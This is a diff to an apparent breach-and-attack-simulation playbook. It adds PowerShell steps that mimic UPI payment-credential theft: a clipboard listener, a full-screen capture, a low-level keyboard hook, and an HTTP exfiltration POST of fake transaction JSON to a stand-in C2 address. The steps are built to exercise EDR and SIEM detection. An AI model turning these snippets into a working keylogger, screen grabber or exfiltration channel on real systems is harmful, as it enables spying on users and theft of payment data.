@@ -224,3 +224,136 @@ steps:
         Write-Output "EXEC: HTTP exfil POST to $uri attempted (timeout/refused — expected) — expect Sysmon EID 3 + EID 4688. Payload schema: bas-upi-v1 run_id=$runId vpa=bas-sim@upi. Set BAS_C2_URI for BAS listener. [BAS-SIM]"
       }
     cleanup: ""
+
+  # ── Lab-only steps ─────────────────────────────────────────────────────────
+  # Keyboard hooks, screen capture, clipboard listener — isolated commit per upi.txt
+
+  - name: "Clipboard Monitor (lab — AddClipboardFormatListener, guaranteed unregister)"
+    technique_id: T1115
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: lab-only
+    production_safe: false
+    risk: medium
+    blast_radius: "Registers a clipboard format listener for 3 seconds via Win32 API, then unregisters. Captures zero clipboard content — registration telemetry only."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 10 (ProcessAccess) or EID 7 (image load): user32.dll clipboard API invocation"
+      - "Security EID 4688 (powershell.exe with AddClipboardFormatListener command line)"
+    detection:
+      - "EDR: process registering clipboard listener — UPI VPA/OTP interception precursor"
+      - "SIEM: user32.dll AddClipboardFormatListener from powershell.exe"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $sig = 'using System;using System.Runtime.InteropServices;public class BasClip{[DllImport("user32.dll")]public static extern bool AddClipboardFormatListener(IntPtr hwnd);[DllImport("user32.dll")]public static extern bool RemoveClipboardFormatListener(IntPtr hwnd);[DllImport("user32.dll")]public static extern IntPtr GetDesktopWindow();}'
+      Add-Type -TypeDefinition $sig -ErrorAction SilentlyContinue
+      $hwnd = [BasClip]::GetDesktopWindow()
+      $registered = [BasClip]::AddClipboardFormatListener($hwnd)
+      if ($registered) {
+        Start-Sleep -Milliseconds 3000
+        $unregistered = [BasClip]::RemoveClipboardFormatListener($hwnd)
+        Write-Output "EXEC: clipboard listener registered ($registered) for 3s then unregistered ($unregistered). Zero clipboard content captured — registration telemetry only. Expect EDR hook-API alert. [BAS-SIM]"
+      } else {
+        Write-Output "PASS: AddClipboardFormatListener blocked — EDR or restricted token prevented clipboard listener registration."
+      }
+    cleanup: ""
+
+  - name: "Full Screen Capture (lab — primary monitor, secure wipe, cleanup verified)"
+    technique_id: T1113
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: lab-only
+    production_safe: false
+    risk: high
+    blast_radius: "Captures primary monitor only (no multi-monitor). Saves to %TEMP%\\bas_fullscreen_<id>.bmp, overwrites with blank bitmap, deletes, verifies removal."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 11 (file create + modify): bas_fullscreen_<id>.bmp in %TEMP%"
+      - "Security EID 4688 (powershell.exe with full screen Graphics.CopyFromScreen)"
+    detection:
+      - "EDR: full-resolution screen capture from non-legitimate process — OTP harvest signal"
+      - "SIEM: large bmp file created in %TEMP% by powershell.exe"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      Add-Type -AssemblyName System.Drawing, System.Windows.Forms
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $file = Join-Path $env:TEMP "bas_fullscreen_$runId.bmp"
+      $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+      $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+      $g   = [System.Drawing.Graphics]::FromImage($bmp)
+      $g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+      $bmp.Save($file)
+      $sz = (Get-Item $file -ErrorAction SilentlyContinue).Length
+      $g.Dispose(); $bmp.Dispose()
+      $blank = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+      $blank.Save($file)
+      $blank.Dispose()
+      Remove-Item $file -Force -ErrorAction SilentlyContinue
+      $cleaned = -not (Test-Path $file)
+      Write-Output "FAIL: primary screen captured ($($screen.Width)x$($screen.Height), $sz bytes), secure-wiped, removed (cleaned=$cleaned). EDR should alert on screen-capture API. [BAS-SIM]"
+    cleanup: |
+      Remove-Item (Join-Path $env:TEMP 'bas_fullscreen_*.bmp') -Force -ErrorAction SilentlyContinue
+
+  - name: "Keyboard Hook (lab — WH_KEYBOARD_LL, zero keystrokes, guaranteed unhook)"
+    technique_id: T1056.001
+    framework: custom
+    executor: powershell
+    timeout_sec: 30
+    fidelity: lab-only
+    production_safe: false
+    risk: high
+    blast_radius: "Installs WH_KEYBOARD_LL hook via SetWindowsHookEx, waits 2 seconds, immediately unhooks. Captures ZERO keystrokes by design — hook registration telemetry only."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 7 (image load): user32.dll loaded by powershell.exe"
+      - "Security EID 4688 (powershell.exe with SetWindowsHookEx command line)"
+    detection:
+      - "EDR: SetWindowsHookEx WH_KEYBOARD_LL from non-input-method process — keylogger registration"
+      - "SIEM: low-level keyboard hook from powershell.exe — UPI credential capture precursor"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $sig = 'using System;using System.Runtime.InteropServices;public class BasHook{public delegate IntPtr HookProc(int code,IntPtr wParam,IntPtr lParam);[DllImport("user32.dll")]public static extern IntPtr SetWindowsHookEx(int id,HookProc fn,IntPtr mod,uint tid);[DllImport("user32.dll")]public static extern bool UnhookWindowsHookEx(IntPtr hook);[DllImport("user32.dll")]public static extern IntPtr CallNextHookEx(IntPtr hook,int code,IntPtr wParam,IntPtr lParam);[DllImport("kernel32.dll")]public static extern IntPtr GetModuleHandle(string name);public const int WH_KEYBOARD_LL=13;public static IntPtr Proc(int code,IntPtr wParam,IntPtr lParam){return CallNextHookEx(IntPtr.Zero,code,wParam,lParam);}}'
+      Add-Type -TypeDefinition $sig -ErrorAction SilentlyContinue
+      $hMod  = [BasHook]::GetModuleHandle($null)
+      $cb    = [BasHook+HookProc][BasHook]::Proc
+      $hHook = [BasHook]::SetWindowsHookEx([BasHook]::WH_KEYBOARD_LL, $cb, $hMod, 0)
+      $registered = $hHook -ne [IntPtr]::Zero
+      if ($registered) {
+        Start-Sleep -Milliseconds 2000
+        $unhooked = [BasHook]::UnhookWindowsHookEx($hHook)
+        Write-Output "EXEC: WH_KEYBOARD_LL hook registered (hook=$hHook) for 2s, unhooked ($unhooked). Zero keystrokes captured — telemetry only. Expect EDR SetWindowsHookEx alert. [BAS-SIM]"
+      } else {
+        Write-Output "PASS: SetWindowsHookEx WH_KEYBOARD_LL blocked — EDR or restricted environment prevented keyboard hook registration."
+      }
+    cleanup: ""
+
+  - name: "HTTP Exfil POST (lab — BAS listener, bas-upi-v1 schema)"
+    technique_id: T1071.001
+    framework: custom
+    executor: powershell
+    timeout_sec: 20
+    fidelity: lab-only
+    production_safe: false
+    risk: medium
+    blast_radius: "HTTP POST to BAS_C2_URI or RFC5737 198.51.100.1 with versioned bas-upi-v1 JSON payload. No real internet egress."
+    reversible: true
+    telemetry:
+      - "Sysmon EID 3 (network connection): powershell.exe to BAS_C2_URI or 198.51.100.1"
+      - "Security EID 4688 (powershell.exe with Invoke-WebRequest POST command line)"
+    detection:
+      - "EDR: outbound HTTP POST with UPI transaction JSON — full exfil payload simulation"
+      - "DLP: JSON body with schema=bas-upi-v1 + vpa/txn_id/amount fields for SIEM parsing"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $runId = if ($env:BAS_RUN_ID) { $env:BAS_RUN_ID.Substring(0,[Math]::Min(8,$env:BAS_RUN_ID.Length)) } else { '{0:x8}' -f (Get-Random -Maximum 0x7FFFFFFF) }
+      $uri   = if ($env:BAS_C2_URI) { $env:BAS_C2_URI } else { 'http://198.51.100.1/bas-upi-exfil' }
+      $body  = '{"schema":"bas-upi-v1","run_id":"' + $runId + '","vpa":"bas-sim@upi","txn_id":"BAS-' + $runId + '","amount":"1.00","acct":"XXXXXX1234","ifsc":"BAS0001234"}'
+      try {
+        $r = Invoke-WebRequest -Uri $uri -Method POST -Body $body -ContentType 'application/json' -TimeoutSec 5 -ErrorAction Stop
+        Write-Output "EXEC: HTTP exfil POST to $uri succeeded ($($r.StatusCode)). Schema: bas-upi-v1 run_id=$runId. [BAS-SIM]"
+      } catch {
+        Write-Output "EXEC: HTTP exfil POST to $uri attempted (timeout — expected without listener). Schema: bas-upi-v1 run_id=$runId vpa=bas-sim@upi txn_id=BAS-$runId. Set BAS_C2_URI for full simulation. [BAS-SIM]"
+      }
+    cleanup: ""
